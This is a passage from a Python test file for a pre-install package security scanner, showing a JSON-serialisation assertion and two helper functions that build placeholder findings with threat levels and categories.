        )
        data = render_preinstall_json(report)
        # Must not raise
        encoded = json.dumps(data)
        assert isinstance(encoded, str)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _finding(level: ThreatLevel) -> PreinstallFinding:
    """Create a minimal PreinstallFinding for testing.

    Uses EXECUTABLE_HOOK (a non-deserialization category) so that level-based
    verdict tests don't collide with the deser-forced BLOCK logic.
    """
    return PreinstallFinding(
        category=ThreatCategory.EXECUTABLE_HOOK,
        level=level,
        file="setup.py",
        line=1,
        description="test finding",
        evidence="postinstall hook",
        recommendation="remove it",
    )


def _finding_cat(category: ThreatCategory) -> PreinstallFinding:
    """Create a minimal PreinstallFinding with a given category."""
    return PreinstallFinding(
        category=category,
        level=ThreatLevel.CRITICAL,
        file="test.yaml",
        line=1,
        description="test finding",
        evidence="evidence",
        recommendation="fix it",
    )
